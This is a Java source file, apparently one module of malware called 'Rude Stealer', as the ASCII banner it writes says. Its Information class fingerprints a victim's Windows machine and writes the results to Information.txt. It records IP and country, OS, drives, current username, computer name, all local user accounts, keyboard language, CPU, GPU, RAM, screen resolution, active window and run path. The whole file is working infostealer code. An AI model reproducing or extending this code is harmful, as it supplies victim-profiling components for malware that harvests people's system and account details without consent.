package _256.node.nodes.impl;

import java.awt.Dimension;
import java.awt.Toolkit;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Scanner;

import com.sun.jna.platform.win32.Netapi32Util;

import _256.main.Start;
import _256.node.Category;
import _256.node.Node;
import _256.utils.Util;

public class Information extends Node {

	public Information() {
		super(Category.FILE);
	}

	@Override
	public void createNode() {
		try {
			FileWriter writer = new FileWriter(getFolder() + "\\" + "Information.txt", true);
			BufferedWriter bufferedWriter = new BufferedWriter(writer);
			bufferedWriter.write("  _____  _    _ _____  ______     _____ _______ ______          _      ______ _____  \r\n"
					+ " |  __ \\| |  | |  __ \\|  ____|   / ____|__   __|  ____|   /\\   | |    |  ____|  __ \\ \r\n"
					+ " | |__) | |  | | |  | | |__     | (___    | |  | |__     /  \\  | |    | |__  | |__) |\r\n"
					+ " |  _  /| |  | | |  | |  __|     \\___ \\   | |  |  __|   / /\\ \\ | |    |  __| |  _  / \r\n"
					+ " | | \\ \\| |__| | |__| | |____    ____) |  | |  | |____ / ____ \\| |____| |____| | \\ \\ \r\n"
					+ " |_|  \\_\\\\____/|_____/|______|  |_____/   |_|  |______/_/    \\_\\______|______|_|  \\_\\\r"
					+ "                                                                                     ");
			bufferedWriter.newLine();
			bufferedWriter.write("Date: " + Util.getTime());
			bufferedWriter.newLine();
			bufferedWriter.write("IP: " + Util.getIP());
			bufferedWriter.newLine();
			bufferedWriter.write("Country: " + Util.getCountry());
			bufferedWriter.newLine();
			bufferedWriter.newLine();
			BufferedReader br_os = new BufferedReader(new FileReader(getFolder() + "\\" + "Properties.txt"));
			try {
				String line;
				while ((line = br_os.readLine()) != null) {
					if (line.trim().startsWith("Operating System:")) {
						bufferedWriter.write(line.trim().replaceAll("Operating System:", "OS:"));
					}
				}
				br_os.close();
			} catch (IOException ex) {
				ex.printStackTrace();
			}
			bufferedWriter.newLine();
			Util.printDrives();
			File myObj = new File(System.getProperty("user.home") + "\\Documents\\drives.txt");
			Scanner myReader = null;
			try {
				myReader = new Scanner(myObj);
			} catch (FileNotFoundException e) {
				e.printStackTrace();
			}
			while (myReader.hasNextLine()) {
				String data = myReader.nextLine();
				bufferedWriter.write("Logical drives: " + data);
			}
			myReader.close();
			bufferedWriter.newLine();
			bufferedWriter.write("Current username: " + System.getProperty("user.name"));
			bufferedWriter.newLine();
			bufferedWriter.write("Computer name: " + Util.getComputerName());
			bufferedWriter.newLine();
			bufferedWriter.write("Computer users: ");
			Netapi32Util.User[] users = Netapi32Util.getUsers();
			for (Netapi32Util.User user : users) {
				bufferedWriter.write(user.name + ", ");
			}
			bufferedWriter.newLine();
			try {
				BufferedReader br_key = new BufferedReader(new FileReader(getFolder() + "\\" + "Properties.txt"));
				String line;
				while ((line = br_key.readLine()) != null) {
					if (line.trim().startsWith("Language:")) {
						bufferedWriter.write(line.trim().replaceAll("Language:", "Keyboard:"));
					}
				}
				br_key.close();

			} catch (IOException ex) {
				ex.printStackTrace();
			}
			bufferedWriter.newLine();
			bufferedWriter.newLine();
			bufferedWriter.write("CPU name: " + Util.getCPU());
			bufferedWriter.newLine();
			bufferedWriter.write("Number of CPU kernels: " + Util.getCPUKernels());
			bufferedWriter.newLine();
			try {
				BufferedReader br_gpu = new BufferedReader(new FileReader(getFolder() + "\\" + "Properties.txt"));
				String line;
				while ((line = br_gpu.readLine()) != null) {
					if (line.trim().startsWith("Card name:")) {
						bufferedWriter.write(line.trim().replaceAll("Card name:", "GPU name:").replaceAll("Unknown", "").replaceAll("GPU name: GPU name: ", "GPU name: "));
					}
				}
				br_gpu.close();
			} catch (IOException ex) {
				ex.printStackTrace();
			}
			bufferedWriter.newLine();
			bufferedWriter.write("RAM: " + Util.getTotalRAM());
			bufferedWriter.newLine();
			Dimension size = Toolkit.getDefaultToolkit().getScreenSize();
			int width = (int) size.getWidth();
			int height = (int) size.getHeight();
			bufferedWriter.write("Screen resolution: " + width + "x" + height);
			bufferedWriter.newLine();
			bufferedWriter.newLine();
			bufferedWriter.write("Active window: " + Util.getActiveWindow());
			bufferedWriter.newLine();
			bufferedWriter.write("Working path: " + new File(Start.class.getProtectionDomain().getCodeSource().getLocation().toString()));
			bufferedWriter.close();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
}
